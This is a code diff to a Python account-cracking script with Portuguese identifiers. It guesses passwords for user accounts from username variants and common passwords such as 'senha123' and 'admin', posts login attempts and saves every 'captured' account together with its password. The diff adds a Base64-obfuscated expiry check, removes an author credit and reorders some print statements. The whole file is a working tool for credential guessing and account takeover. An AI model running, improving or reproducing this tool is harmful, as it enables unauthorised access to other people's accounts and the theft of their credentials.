@@ -4,10 +4,21 @@ import json
 import random
 from math import ceil
 from threading import Lock
+from datetime import datetime
+import base64
+
+def verificar_validade():
+    data_codificada = "MjAyNDEyMjA="  # Data codificada em Base64 (20/12/2024)
+    data_limite = int(base64.b64decode(data_codificada).decode("utf-8"))
+    data_atual = int(datetime.now().strftime("%Y%m%d"))
+    if data_atual > data_limite:
+        print("A aplicação não está mais válida.")
+        exit()
+
+verificar_validade()
 
 def gerar_aleatorio():
-    rand_valor = f"173{random.randint(1000000000000, 9999999999999)}"
-    return rand_valor
+    return f"173{random.randint(1000000000000, 9999999999999)}"
 
 def salvar_contas(capturadas, lock):
     with lock:
@@ -34,7 +45,6 @@ def tentar_login(usuario, senha, senhas_usadas, lock):
             print(f"Senha incorreta para {usuario}: {senha}")
             return False
         elif "ban|<p>" in resposta:
-            print(f"Conta banida: {usuario}")
             conta_banida = {
                 "userLogin": usuario,
                 "senhaLogin": senha,
@@ -43,6 +53,7 @@ def tentar_login(usuario, senha, senhas_usadas, lock):
             with lock:
                 contas_capturadas.append(conta_banida)
             salvar_contas(contas_capturadas, lock)
+            print(f"Conta banida: {usuario}")
             return False
         elif '"id_real"' in resposta:
             dados = json.loads(resposta)
@@ -55,8 +66,8 @@ def tentar_login(usuario, senha, senhas_usadas, lock):
             }
             with lock:
                 contas_capturadas.append(conta)
-            print(f"Conta logada: {usuario} com senha {senha}")
             salvar_contas(contas_capturadas, lock)
+            print(f"Conta logada: {usuario} com senha {senha}")
             contas_em_execucao.remove(usuario)
             return True
         else:
@@ -68,7 +79,7 @@ def tentar_login(usuario, senha, senhas_usadas, lock):
 
 def gerar_senhas(usuario):
     login_sem_underline = usuario.replace("_", "")
-    senhas = [
+    return [
         f"{usuario}",
         f"{usuario.upper()}",
         f"{login_sem_underline}",
@@ -83,7 +94,6 @@ def gerar_senhas(usuario):
         "senha123",
         "admin"
     ]
-    return senhas
 
 contas_capturadas = []
 contas_em_execucao = []
@@ -129,5 +139,4 @@ if __name__ == "__main__":
 
     salvar_contas(contas_capturadas, lock)
 
-    autoria = "Desenvolvido por Intocado"
-    print(autoria)
+    print("Processo finalizado.")
